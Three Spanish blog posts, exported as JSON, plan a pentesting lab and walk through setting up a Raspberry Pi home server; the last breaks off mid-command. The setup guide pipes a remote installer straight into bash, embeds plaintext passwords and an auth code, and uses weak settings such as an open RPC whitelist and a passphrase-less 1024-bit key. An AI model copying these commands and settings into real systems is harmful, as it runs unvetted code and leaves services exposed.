[{"content":"En este artículo se detallan los servicios que se van a usar junto con una pequeña descripción de los distintos niveles de madurez de estos. Estos niveles de madurez los vamos a clasificar como basic, advanced y hardening.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nDMZ Servers: DB SQL (MariaDB) DB NoSQL (MongoDB) FTP (vsftpd) Web Security Dojo WAF (ModSecurity) WEB (Apache2) Monitorización (Nagios) Almacenamiento (Owncloud) Muña Wordpress Prestashop Joomla Drupal Radius (freeradius) DNS (bind9) Honeypot (Cowrie) Correo (Postfix) Router firewall VPN IPv6 IDS LAN Servers VoIP (Asterisk) LDAP (OpenLDAP) SIEM (ELK) SIEM (Splunk) SIEM (EventLog Analyzer) Active Directory WEB (IIS) Almacenamiento (SharePoint) DB SQL (SQL Server) ory/hydra OpenID ory/hydra OAuth2 LAN PCs Windows XP Windows 7 Windows 10 DMZ Servers En esta subred se encuentran todos aquellos servicios que son alcanzables desde el exterior. Algunos de estos servicios tienes un acceso limitad a la subred interna de servidores, como por ejemplo para enviar los logs generados.\nDB SQL (MariaDB) Se usará MariaDB como base da datos SQL que almacena los datos de los siguientes servicios:\nOwncloud Asterisk Wordpress Prestashop Joomla Basic Está será la configuración que viene por defecto, con la excepción de que tiene que permitir conexiones desde cualquier IP, ya que será usada por servicios que tienen distintas IPs y que tendrá habilitada la auditoria para poder enviar.\nAdvanced Está configuración tendrá mayores medidas de seguridad, como limitar el acceso por IP únicamente a los servicios que necesitan acceso a la base de datos.\nHardening Esta configuración será mucho más avanzada, se usará la guía del CIS para hardenizar la base de datos.\n//TODO Poner url pdf cis mysql\nDB NoSQL (MongoDB) //TODO ver el uso que se le da\nBasic Advanced Hardening FTP (vsftpd) Se usará vsftpd como servidor FTP de la organización para la descarga de datos.\nBasic Está será la configuración que viene por defecto.\nAdvanced Está configuración tendrá mayores medidas de seguridad, como pueden ser:\nUsar un servicio LDAP para la gestión de usuarios Usar únicamente FTPS (FTP over SSL) o SFTP (SSH File Transfer Protocol) Usar algún servicio como fail2ban para evitar ataques de fuerza bruta. Hardening Esta configuración será mucho más avanzada, se usará la guía del CIS para hardenizar el servicio.\nWeb Security Dojo Web Security Dojo es un entorno de aprendizaje autónomo de código abierto para pruebas de penetración de seguridad de aplicaciones web, cuyos objetivos son:\nOWASP\u0026rsquo;s WebGoat Google’s Gruyere Damn Vulnerable Web App Hacme Casino OWASP InsecureWebApp w3af\u0026rsquo;s test website simple training targets by Maven Security (including REST and JSON) WAF (ModSecurity) ModSecurity es un firewall de aplicaciones Web (WAF) embebible que se ejecuta como un módulo del servidor web Apache, provee protección contra diversos ataques hacia aplicaciones Web y permite monitorizar tráfico HTTP.\n\\TODO Investigar si tiene que estar como server proxy inverso o puede estar con el Apache junto con el resto de servicios (Menos consumo de recursos)\nBasic No va a estar configurado y únicamente redireccionará todas las peticiones HTTP al su respectivo servidor web\nAdvanced Se va a configurar con el objetivo de que sea capaz de evitar SQL Injection y otros tipos de ataques web.\nHardening Esta configuración será mucho más avanzada, se usará la guía del CIS para hardenizar el servidor web.\nWEB (Apache2) Se va a usar el servidor web Apache para desplegar una serie de servicios y CMS como son:\nMuña Nagios Owncloud Muña Wordpress Prestashop Joomla Drupal WebGoat phpmyadmin Además se van a probar diferentes configuraciones de Apache para poner determinadas partes de una web con contraseña o usar el nuevo protocolo QUIC – HTTP/3.\nBasic Está será la configuración que viene por defecto, con la excepción de que se crearán virtualhost para cada una de las aplicaciones que se van a levantar usando Apache.\nAdvanced Esta configuración hará uso de SSL y de certificados generados y firmados por una CA auto-firmada.\nHardening Esta configuración será mucho más avanzada, se usará la guía del CIS para hardenizar el servidor web.\nMonitorización (Nagios) Se va a usar este servicio par monitorizar el funcionamiento de todos los hosts de la arquitectura, usando el protocolo SNMP, por lo que todos tendrán que tener configurado este protocolo.\nBasic Está será la configuración que viene por defecto, utilizando SNMPv2 para la monitorización de los hosts.\nAdvanced Esta configuración hará uso de un certificado para cifrar las comunicaciones. Además que se cambiara SNMPv2 por SNMPv3 para que el tráfico de monitorización vaya cifrado.\nHardening \\TODO\nAlmacenamiento (Owncloud) Basic Advanced Hardening Muña Muña es una aplicación vulnerable cuyo objetivo es practicar seguridad y hacking ético de aplicaciones y servicios web.\nPermite practica como atacar usando técnicas como inyección SQL, XSS, exposición de Recursos, exposición de Credenciales, seguridad de Base de Datos, etc.\nTambién permite aprender como defenderte escribiendo código seguro y otras formas de prevención para las aplicaciones.\nBasic Está será la configuración que viene por defecto.\nAdvanced Está configuración se realizará tras un análisis del código y realizando la programación necesaria para securizar la aplicación web y eliminar las vulnerabilidades detectadas en la fase anterior.\nWordpress Basic Advanced Hardening Prestashop Basic Advanced Hardening Joomla Basic Advanced Hardening Drupal Basic Advanced Hardening Radius (freeradius) Basic Advanced Hardening DNS (bind9) Basic Advanced Hardening Honeypot (Cowrie) Basic Advanced Hardening Correo (Postfix) Basic Advanced Hardening Router IDS LAN Servers VoIP (Asterisk) LDAP (OpenLDAP) SIEM (ELK) SIEM (Splunk) SIEM (EventLog Analyzer) Active Directory WEB (IIS) Almacenamiento (SharePoint) DB SQL (SQL Server) ory/hydra OpenID ory/hydra OAuth2 LAN PCs ","date":"2020-10-12T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/escenario_para_pentesting_ii_servicios/","title":"Escenario para Pentesting (II). Servicios desplegados (WIP)"},{"content":"Se va a diseñar un escenario virtual que emule una infraestructura de una empresa de cierto tamaño, aunque para reducir el uso de recursos necesarios para el despliegue del escenario, se van a juntar los servicios que tienen coherencia en la misma máquina, haciendo por ejemplo que distintas bases de datos estén en el mismo host.\nLos principales objetivos para el desarrollo de este escenario son los siguientes:\nEstudio en profundidad de los principales servicios usados en la actualidad, ya que va a ser necesario instalarlos y configurarlos adecuadamente. Creación de un escenario (basic) con las distintas configuraciones de los servicios por defecto a excepción de los logs, que serán enviados a un servidor centralizado de logs, lo que nos permitirá posicionarnos desde dos puntos de vista diferentes: Red Team: que tiene como objetivo realizar un estudio de estas configuraciones buscando fallos de seguridad en estas para posteriormente realizar ataques aprovechándose de esas configuraciones por defecto. Blue Team: Al mismo tiempo, desde este punto de vista realizaremos un análisis de los logs para ver que rastros se dejan durante el ataque. Creación de un escenario (advanced) al que se le van a aplicar configuraciones adecuadas según las necesidades de cada servicio desplegado. En esta etapa también se probará a realizar distintos tipos de ataque y analizar los logs para ver los registros generados. Creación de un escenario (hardening) en el que todas las maquinas y servicios van a tener aplicadas configuraciones más robustas siguiendo estándares de guías como el CIS o el NIST. Las principales herramientas que se van a utilizar para el despliegue del escenario son las siguientes:\nProxmox: Proxmox Virtual Environment, o Proxmox VE, es un entorno de virtualización de servidores de código abierto. Está en distribuciones GNU/Linux basadas en Debian con una versión modificada del Kernel RHEL y permite el despliegue y la gestión de máquinas virtuales y contenedores. Proxmox VE incluye una consola Web y herramientas de línea de comandos, y proporciona una API REST para herramientas de terceros. Dos tipos de virtualización son compatibles: los contenedores basados con LXC y la virtualización con KVM. Viene con un instalador e incluye un sitio Web basado en la interfaz de administración. Terraform: Terraform es un software de infraestructura como código (IaaC) desarrollado por HashiCorp. Permite a los usuarios definir y configurar la infraestructura de un centro de datos en un lenguaje de alto nivel, generando un plan de ejecución para desplegar la infraestructura en Proxmox, OpenStack, AWS, Azure, etc. Bash: Para la automatización de configuración y despliegue de Proxmox, hosts y los distintos contenedores se van a utilizar scripts hechos en bash que realicen una configuración inicial. Ansible: Para la instalación y configuración de los servicios en todos los hosts. El objetivo es crear distintos entornos siendo AnNsible el encargado de aplicar las configuraciones más o menos robustas según el entorno. Los sistemas operativos que se van a usar para desplegar los distintos servicios son:\nLinux: Se usarán distintas distribuciones Linux para hacer un escenario más heterogéneo, estos Sistemas Operativos están basados en las principales distribuciones Linux y son los siguientes: Debian 10 CentOS 7 Windows: Se usaran Sistemas Operativo basados en Windows para los hosts de los usuarios y para dos servidores que tienen un Active Directory, estos son los siguientes: Windows Server 2019 Windows Server 2012 Windows 10 Windows 7 Windows XP A continuación podemos ver un diagrama simplificado de como será la arquitectura desplegada, los equipos que están dentro del cuadrado son aquellos que serán virtualizados.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\n","date":"2020-09-15T00:00:00Z","image":"https://www.procamora.com/covers/pentesting.png","permalink":"https://www.procamora.com/p/escenario_para_pentesting_i_introduccion/","title":"Escenario para Pentesting (I). Introducción y objetivos (WIP)"},{"content":"Para crear la imagen con Raspbian ejecutaremos:\n1 2 3 4 5 sudo dd bs=4M if=2020-08-20-raspios-buster-armhf-lite.img of=/dev/sdh conv=fsync status=progress sudo sync # montar en /run/media/procamora/boot/ touch /run/media/procamora/boot/ssh sudo sync Instalación y configuración inicial Lo primero que vamos a realizar es comprobar si tenemos bien configurados las configuraciones de idiomas, y así evitar posibles errores a la hora de actualizar e instalar nuevos programas. Para ello vamos a ejecutar el comando locale y ver si están configuradas todas las variables de entorno, en caso de que haya alguna vacia vamos a ejecutar:\n1 2 3 4 5 export LANGUAGE=en_US.UTF-8 export LANG=en_US.UTF-8 export LC_ALL=en_US.UTF-8 sudo dpkg-reconfigure locales sudo locale-gen en_US.UTF-8 Normalmente las que suelen estar vacías son: LANGUAGE y LC_ALL.\nUna vez que ya tenemos configurados correctamente los locales podemos actualizar el repositorio, los paquetes y el firmware con los comandos:\n1 2 3 4 5 6 7 sudo apt update \u0026amp;\u0026amp; sudo apt dist-upgrade -y sudo reboot # Reinicio recomendable #sudo rpi-update # no recomendable sudo reboot export LC_ALL=C.UTF-8 ## IMPORTANTE PARA QUE FUNCIONE descomprime_rar.py\nConfiguración inicial Una vez que esto todo el sistema actualizado procedemos a ejecutar el comando y a ir nivel a nivel realizando todas las configuraciones de la Rasperry:\n1 sudo raspi-config Change User Password (Change password for the \u0026lsquo;pi\u0026rsquo; user)\nNetwork Options (Configure network settings) N1 Hostname N2 Wi-Fi N3 Network interfaces names (disable predicrable network interfaces)\nBoot Options (Configure options for start-up)\nLocalisation Options (Set up language and regional settings to match your location) I1 Change Locale en_US.UTF-8 UTF-8 Default en_US.UTF-8 I2 Change Timezone Europe \u0026gt; Madrid I3 Change Keyborad Layaout I4 Change Wi-fi Country\nInterfacing Options Deshabilitar todo menos SSH P2 SSH habilitar\nAdvanced Options (Configure advanced settings) A1 Expand Filesystem (Ensures that all of the SD card storage is available to the OS)\nInstalación de paquetes Los paquetes que vamos a necesitar siempre son los siguientes:\n1 2 3 sudo apt install -y vim encfs rsync zsh git python3 python3-pip python3-dev trash-cli screen gcc make \\ cmake sshfs expect smbclient tar tcpdump htop build-essential wget curl tmux raspberrypi-kernel \\ raspberrypi-kernel-headers atop En caso de instalar todos los servicios, necesitaremos los paquetes:\n1 sudo apt install -y samba transmission-daemon transmission-cli transmission-common wakeonlan vsftpd apache2 apache2-utils libapache2-mod-perl2 par2 perl zlib1g zlib1g-dev rrdtool perl-doc libarchive-zip-perl libfile-listing-perl libxml-rss-perl libcgi-session-perl libacl1-dev pwgen libapache2-mod-php mariadb-server mariadb-client openssl php php-imagick php-common php-curl php-gd php-imap php-intl php-json php-mbstring php-mysql php-ssh2 php-xml php-zip php-apcu bzip2 jq inetutils-ping php-smbclient coreutils php-ldap mlocate php-apcu php-http-request Configuración zsh Para la configuración del entorno con zsh vamos a utilizar el script que he desarrollado que automatiza todo el proceso:\n1 2 3 git clone https://github.com/procamora/custom_workspace cd custom_workspace ./custom_workspace.sh zsh Fichero hosts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 git clone https://github.com/StevenBlack/hosts pip3 install --user -r hosts/requirements.txt echo \u0026#34;# Custom host records are listed here. 192.168.1.1 router 192.168.1.71 rp4 backuppc.procamora.com owncloud.procamora.com procamora.myvnc.com 192.168.1.72 zero 192.168.1.73 rp3 192.168.1.74 win10 192.168.1.75 xiaomi 192.168.1.76 huawei 192.168.1.77 mia1 192.168.1.78 4770k # End of custom host records. \u0026#34; \u0026gt; hosts/myhosts python3 hosts/testUpdateHostsFile.py sudo python3 hosts/updateHostsFile.py --auto --replace \u0026gt; /dev/null # Tarda unos 15 segundos Fichero crontab 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user command to be executed #GESTOR SERIES */20 * * * * pi cd /home/pi/series_manager/ \u0026amp;\u0026amp; python3 /home/pi/series_manager/app/utils/descarga_automatica_cli.py \u0026gt;\u0026gt; /tmp/descargas.log 2\u0026gt;\u0026amp;1 0 * * * * pi cd /home/pi/series_manager/ \u0026amp;\u0026amp; python3 /home/pi/series_manager/app/utils/descomprime_rar.py \u0026gt;\u0026gt; /tmp/unrar.log 2\u0026gt;\u0026amp;1 # Mantenimiento */15 * * * * pi find /home/pi/scripts/ -type f ! -executable -regex \u0026#39;.*\\.\\(sh\\|py\\|exp\\)\u0026#39; -exec chmod u+x {} \\; 30 22 * * * pi cd /home/pi/decrypt_gdrive/ \u0026amp;\u0026amp; bash rsync_rp3.sh \u0026gt; /tmp/rsync.log 2\u0026gt;\u0026amp;1 #0 * * * * pi cd /home/pi/scripts \u0026amp;\u0026amp; python3 /home/pi/scripts/insync.py \u0026gt;\u0026gt; /tmp/insync.log 2\u0026gt;\u0026amp;1 #*/15 * * * * pi sudo find /media/HDD/* -type d -prune -print | grep -v backup | sed -r \u0026#39;s/\\s+/\\\\ /g\u0026#39; | xargs chmod 755 -R #*/15 * * * * pi sudo find /media/HDD/* -type d -prune -print | grep -v backup | sed -r \u0026#39;s/\\s+/\\\\ /g\u0026#39; | xargs chown pi:pi -R #DOMOTICA #20 8 * * * pi /home/pi/tg/bin/telegram-cli -e \u0026#39;msg domotica_pablo \u0026#34;/modo_automatico on 23\u0026#34;\u0026#39; \u0026gt;/tmp/tg_on.log 2\u0026gt;/tmp/tg_on_err.log #30 8 * * * pi /home/pi/tg/bin/telegram-cli -e \u0026#39;msg domotica_pablo \u0026#34;/set_rele off\u0026#34;\u0026#39; \u0026gt;/tmp/tg_off.log 2\u0026gt;/tmp/tg_on_err.log ##WIKI PERSONAL */15 * * * * pi cd /home/pi/wiki/ \u0026amp;\u0026amp; bash pushgit.sh 1 \u0026gt;\u0026gt; /tmp/wiki_cont 2\u0026gt;\u0026amp;1 # Bots #* * * * * root sudo systemctl -q is-active mio_bot_recordatorios.service \u0026amp;\u0026amp; echo YES || sudo systemctl restart mio_bot_recordatorios.service * * * * * root sudo systemctl -q is-active mio_bot_common_ports.service \u0026amp;\u0026amp; echo YES || sudo systemctl restart mio_bot_common_ports.service * * * * * root sudo systemctl -q is-active mio_bot_dictionary.service \u0026amp;\u0026amp; echo YES || sudo systemctl restart mio_bot_dictionary.service * * * * * root sudo systemctl -q is-active mio_bot_minitrue.service \u0026amp;\u0026amp; echo YES || sudo systemctl restart mio_bot_minitrue.service * * * * * root sudo systemctl -q is-active mio_bot_series_manager.service \u0026amp;\u0026amp; echo YES || sudo systemctl restart mio_bot_series_manager.service Fichero fstab 1 2 3 4 echo \u0026#34;UUID=1eb2f592-bee9-462d-9ac5-263870d2c04a /media/HDD btrfs defaults 0 0\u0026#34; | sudo tee -a /etc/fstab sudo mkdir -p /media/HDD sudo mount -a Gestión de claves privadas Para dejar el directorio SSH con los permisos adecuados ejecutamos:\n1 2 3 4 5 6 7 eval \u0026#34;$(ssh-agent -s)\u0026#34; mkdir -p ~/.ssh chmod 700 ~/.ssh touch ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys # le quitamos los permisos necesarios En caso de querer generar un certificado SSH para servicios y sin contraseña podemos ejecutar los siguientes comandos, pero es mejor usar el que ya tengo generado y que esta añadido en el resto de hosts.\n1 2 3 4 5 6 7 8 9 10 ssh-keygen -t rsa -b 1024 -f ~/.ssh/services -N \u0026#34;\u0026#34; -q -C \u0026#34;key used for automation service connections\u0026#34; ssh-add ~/.ssh/services # ponemos la contraseña y ya tenemos cargada la clave ssh-add -l ssh-copy-id -i ~/.ssh/services root@zero ssh-copy-id -i ~/.ssh/services pi@zero ssh-copy-id -i ~/.ssh/services root@4770k ssh-copy-id -i ~/.ssh/services procamora@4770k Swap Raspberry OS suele venir configurado con 100Mb de swap, algo que en ciertas ocasiones en insuficiente, podemos aumentarlo a 2Gb con los siguientes comandos:\n1 2 3 4 5 cat /proc/meminfo | grep Swap sudo sed -i \u0026#34;s/CONF_SWAPSIZE=[[:digit:]]\\+/CONF_SWAPSIZE=2048/\u0026#34; /etc/dphys-swapfile sudo dphys-swapfile setup sudo dphys-swapfile swapon cat /proc/meminfo | grep Swap Transmission La instalación de Transmission requiere de algo mas de configuración a nivel de permisos, ya que si se dejan los permisos por defecto, a la hora de acceder por sshfs con el usuario pi nos encontraremos que no tenemos que no tenemos permisos para borrar las descargas.\nEl primero paso sera instalar el servicio y habilitar para que se inicie con el sistema, una vez hecho esto lo paramos y lo configuramos. Es muy importante pararlo, ya que si se modifica estando encendido el fichero modificado se borrara y se mantendrá el fichero original.\n1 2 3 sudo apt-get install transmission-daemon transmission-cli sudo systemctl enable transmission-daemon.service sudo systemctl stop transmission-daemon.service Una vez parado el servicio, ya podemos modificar el fichero /etc/transmission-daemon/settings.json. A continuación pongo mi fichero de configuración con las partes mas relevantes:\n\u0026ldquo;rpc-username\u0026rdquo;: \u0026ldquo;pi\u0026rdquo;: El usuario para acceder por la interfaz web. \u0026ldquo;rpc-password\u0026rdquo;: \u0026ldquo;raspberry\u0026rdquo;: La contraseña en texto plano para acceder, una vez que se inicie se pondrá su SHA1. \u0026ldquo;watch-dir-enabled\u0026rdquo;: true: Habilitar que se añaden automáticamente todos los torrent que se en encuentren en un direcotrio \u0026ldquo;watch-dir\u0026rdquo;: \u0026ldquo;/home/pi/Downloads\u0026rdquo;: Directorio desde donde añaden automáticamente todos los torrents. \u0026ldquo;download-dir\u0026rdquo;: \u0026ldquo;/media/HDD\u0026rdquo;: Directorio donde se guardan las descargas una vez completadas. \u0026ldquo;incomplete-dir\u0026rdquo;: \u0026ldquo;/media/HDD/tmp\u0026rdquo;: Directorio donde se guarnan las descargas durante el proceso de descarga. \u0026ldquo;umask\u0026rdquo;: 2: Para que los permisos en las descargas sean 775. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 echo \u0026#39;{ \u0026#34;alt-speed-down\u0026#34;: 20000, \u0026#34;alt-speed-enabled\u0026#34;: false, \u0026#34;alt-speed-time-begin\u0026#34;: 540, \u0026#34;alt-speed-time-day\u0026#34;: 127, \u0026#34;alt-speed-time-enabled\u0026#34;: false, \u0026#34;alt-speed-time-end\u0026#34;: 1020, \u0026#34;alt-speed-up\u0026#34;: 500, \u0026#34;bind-address-ipv4\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;bind-address-ipv6\u0026#34;: \u0026#34;::\u0026#34;, \u0026#34;blocklist-enabled\u0026#34;: false, \u0026#34;blocklist-url\u0026#34;: \u0026#34;https://github.com/sahsu/transmission-blocklist/releases/download/1.0.0/blocklist.gz\u0026#34;, \u0026#34;cache-size-mb\u0026#34;: 4, \u0026#34;dht-enabled\u0026#34;: true, \u0026#34;download-dir\u0026#34;: \u0026#34;/media/HDD\u0026#34;, \u0026#34;download-limit\u0026#34;: 100, \u0026#34;download-limit-enabled\u0026#34;: 0, \u0026#34;download-queue-enabled\u0026#34;: true, \u0026#34;download-queue-size\u0026#34;: 6, \u0026#34;encryption\u0026#34;: 1, \u0026#34;idle-seeding-limit\u0026#34;: 30, \u0026#34;idle-seeding-limit-enabled\u0026#34;: true, \u0026#34;incomplete-dir\u0026#34;: \u0026#34;/media/HDD/tmp\u0026#34;, \u0026#34;incomplete-dir-enabled\u0026#34;: true, \u0026#34;lpd-enabled\u0026#34;: false, \u0026#34;max-peers-global\u0026#34;: 200, \u0026#34;message-level\u0026#34;: 1, \u0026#34;open-file-limit\u0026#34;: 32, \u0026#34;peer-congestion-algorithm\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;peer-id-ttl-hours\u0026#34;: 6, \u0026#34;peer-limit-global\u0026#34;: 200, \u0026#34;peer-limit-per-torrent\u0026#34;: 50, \u0026#34;peer-port\u0026#34;: 51413, \u0026#34;peer-port-random-high\u0026#34;: 65535, \u0026#34;peer-port-random-low\u0026#34;: 49152, \u0026#34;peer-port-random-on-start\u0026#34;: false, \u0026#34;peer-socket-tos\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;pex-enabled\u0026#34;: true, \u0026#34;port-forwarding-enabled\u0026#34;: false, \u0026#34;preallocation\u0026#34;: 1, \u0026#34;prefetch-enabled\u0026#34;: true, \u0026#34;queue-stalled-enabled\u0026#34;: true, \u0026#34;queue-stalled-minutes\u0026#34;: 30, \u0026#34;ratio-limit\u0026#34;: 1, \u0026#34;ratio-limit-enabled\u0026#34;: true, \u0026#34;rename-partial-files\u0026#34;: true, \u0026#34;rpc-authentication-required\u0026#34;: true, \u0026#34;rpc-bind-address\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;rpc-enabled\u0026#34;: true, \u0026#34;rpc-host-whitelist\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;rpc-host-whitelist-enabled\u0026#34;: false, \u0026#34;rpc-password\u0026#34;: \u0026#34;raspberry\u0026#34;, \u0026#34;rpc-port\u0026#34;: 9091, \u0026#34;rpc-url\u0026#34;: \u0026#34;/transmission/\u0026#34;, \u0026#34;rpc-username\u0026#34;: \u0026#34;pi\u0026#34;, \u0026#34;rpc-whitelist\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;rpc-whitelist-enabled\u0026#34;: false, \u0026#34;scrape-paused-torrents-enabled\u0026#34;: true, \u0026#34;script-torrent-done-enabled\u0026#34;: false, \u0026#34;script-torrent-done-filename\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;seed-queue-enabled\u0026#34;: false, \u0026#34;seed-queue-size\u0026#34;: 10, \u0026#34;speed-limit-down\u0026#34;: 600, \u0026#34;speed-limit-down-enabled\u0026#34;: false, \u0026#34;speed-limit-up\u0026#34;: 750, \u0026#34;speed-limit-up-enabled\u0026#34;: false, \u0026#34;start-added-torrents\u0026#34;: true, \u0026#34;trash-original-torrent-files\u0026#34;: true, \u0026#34;umask\u0026#34;: 2, \u0026#34;upload-limit\u0026#34;: 100, \u0026#34;upload-limit-enabled\u0026#34;: false, \u0026#34;upload-slots-per-torrent\u0026#34;: 14, \u0026#34;utp-enabled\u0026#34;: true, \u0026#34;watch-dir\u0026#34;: \u0026#34;/home/pi/Downloads\u0026#34;, \u0026#34;watch-dir-enabled\u0026#34;: true }\u0026#39; | sudo tee /etc/transmission-daemon/settings.json El siguiente paso es establecer los permisos necesarios para que todo funcione correctamente, teniendo en cuenta que al disco se va a acceder por varios usuarios, y se tiene que poder escribir y borrar datos.\nPara hacer esto se va a crear el grupo hdd al que vamos a meter los usuarios que necesitan tener acceso al disco, que serán pi, debian-transmission y backuppc (en caso de usarse). Al usuario pi que se la a añadir el grupo como secundario, pero al usuario debian-transmission se le va a poner este grupo como principal, para que al descargar los torrent le ponga permisos del grupo hdd y así el resto de usuarios tengan permisos sobre estos.\nFinalmente vamos a establecer los permisos 775 en el disco para indicar el los usuarios del grupo hdd tienen control total:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sudo addgroup hdd sudo usermod -a -G hdd pi sudo usermod -g hdd debian-transmission # el grupo principal de debian-transmission tiene que ser HDD para que pi puedas borrar ficheros sudo usermod -a -G hdd www-data sudo usermod -a -G hdd backuppc # cuidado que puede que aun no exista sudo usermod -a -G www-data backuppc sudo chown pi:hdd /media/HDD/ sudo chmod 755 /media/ sudo chmod 775 /media/HDD/ -R mkdir -p /home/pi/Downloads sudo chown pi:hdd /home/pi/Downloads -R # debian-transmission permiso leer torrent sudo chmod 775 /home/pi/Downloads Una vez configurado el servicio, ya podemos iniciarlo, es importante hacer un start y no un restart, ya que de este modo la contraseña que se encuentra en texto plano sera sustituida por su hash.\n1 sudo systemctl start transmission-daemon.service owncloud 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 echo \u0026#34;ServerName 127.0.0.1\u0026#34; | sudo tee -a /etc/apache2/apache2.conf my_lang=$(cat /etc/default/locale | grep LANG | awk -F = \u0026#39;{print $2}\u0026#39;) sudo sed -E -i.back \u0026#34;s/LANG\\=(.*)$/LANG=$my_lang/g\u0026#34; /etc/apache2/envvars # Create a Virtual Host Configuration FILE=\u0026#34;/etc/apache2/sites-available/owncloud.conf\u0026#34; echo \u0026#39;Alias /owncloud \u0026#34;/var/www/owncloud/\u0026#34; \u0026lt;Directory /var/www/owncloud/\u0026gt; Options +FollowSymlinks AllowOverride All \u0026lt;IfModule mod_dav.c\u0026gt; Dav off \u0026lt;/IfModule\u0026gt; SetEnv HOME /var/www/owncloud SetEnv HTTP_HOME /var/www/owncloud \u0026lt;/Directory\u0026gt;\u0026#39; | sudo tee $FILE sudo a2ensite owncloud.conf sudo a2enmod dir env headers mime rewrite setenvif sudo systemctl restart apache2 #Configure the Database sudo mysql -u root -e \u0026#34;CREATE DATABASE IF NOT EXISTS owncloud; \\ GRANT ALL PRIVILEGES ON owncloud.* \\ TO owncloud@localhost \\ IDENTIFIED BY \u0026#39;ppu908#m1\u0026#39;\u0026#34;; # Download owncloud cd /var/www sudo wget https://download.owncloud.org/community/owncloud-complete-20200731.tar.bz2 sudo tar -xjf owncloud-complete-20200731.tar.bz2 sudo chown www-data:www-data /var/www/owncloud/ -R cd /var/www/owncloud/ sudo mkdir -p /media/HDD/owncloudData/ sudo chown www-data:hdd /media/HDD/owncloudData/ sudo chmod 700 /media/HDD/owncloudData/ firefox http://192.168.1.71/owncloud/ #CONFIG OWNCLOUD #owncloud #admin/ppu908#m2 #/media/HDD/owncloudData/ #owncloud #ppu908#m1 #owncloud sudo systemctl enable apache2 mariadb VPN 1 curl -L https://install.pivpn.io | bash sudo su -c \u0026ldquo;echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward\u0026rdquo; sudo sysctl -w net.ipv4.ip_forward=1 sudo iptables -t nat -A POSTROUTING -s 10.6.0.0/24 -o eth0 -j MASQUERADE\nEn caso de fallo por actualización del Kernel 1 2 3 4 sudo echo \u0026#34;1\u0026#34; \u0026gt; /boot/.firmware_revision # cambiar hash firmware para forzar descargarlo de nuevo sudo rpi-update sudo reboot sudo apt-get install --reinstall wireguard-dkms configurar firewall con input drop src 192.168.1.1\ntmux\ninsync Usar el articulo: add-count-insync-portable-cli\n1 2 3 4 5 6 7 8 9 10 11 wget https://procamora.github.io/downloads/insync/insync-armhf_1.3.17.36167_i386.tar.bz2 -O $HOME/Downloads/insync-armhf_i386.tar.bz2 tar -xjf $HOME/Downloads/insync-armhf_i386.tar.bz2 -C $HOME cd $HOME/insync-portable firefox https://insynchq.com/auth ./insync-portable add_account --auth-code 2/5ACzcYmorAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ./insync-portable start ./insync-portable manage_selective_sync pablojoserocamora@gmail.com ./insync-portable get_sync_progress cd - ln -s ~/pablojoserocamora@gmail.com/scripts/ ~ mkdir ~/decrypt_gdrive/ Si manege_selective da un fallo de curses.error: setupterm: could not find terminal. Ejecutar el comando:\n```bash export TERM=xterm export TERMINFO=/etc/terminfo ``` ftp https://www.solvetic.com/tutoriales/article/3212-como-instalar-servidor-ftp-linux-centos7/\nunrar Para podemos descomprimir ficheros rar protegidos con contraseña vamos a descargarnos el paquete unrar non-free para arm:\n1 2 wget https://procamora.github.io/downloads/unrar_5.2.7-0.1_armhf.deb sudo dpkg -i unrar_5.2.7-0.1_armhf.deb Importante: No instalar el paquete disponible en los repositorios (unrar-free), ya no funciona con rar con contraseña.\nmotd 1 2 3 4 5 6 7 sudo rm /etc/motd sudo rm /etc/update-motd.d/10-uname #sudo sed -i -E \u0026#39;s/^#?PrintLastLog (yes|no)$/PrintLastLog no/\u0026#39; /etc/ssh/sshd_config sudo wget https://raw.githubusercontent.com/gagle/raspberrypi-motd/master/motd.sh -O /etc/update-motd.d/10-stats sudo chown root:root /etc/update-motd.d/10-stats sudo chmod +x /etc/update-motd.d/10-stats #sudo systemctl restart sshd Programas propios 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 git config --global user.email \u0026#34;pablojoserocamora@gmail.com\u0026#34; git config --global user.name \u0026#34;procamora\u0026#34; # Minitrue git clone git@github.com:procamora/minitrue $HOME/minitrue sudo pip3 install -r $HOME/minitrue/requirements.txt sudo apt install -y nmap texlive-latex-recommended texlive-latex-extra texlive-lang-english chmod u+x $HOME/minitrue/bot_minitrue.py chmod 644 $HOME/minitrue/mio_bot_minitrue.service sudo cp $HOME/minitrue/mio_bot_minitrue.service /lib/systemd/system/ # Series Manager git clone 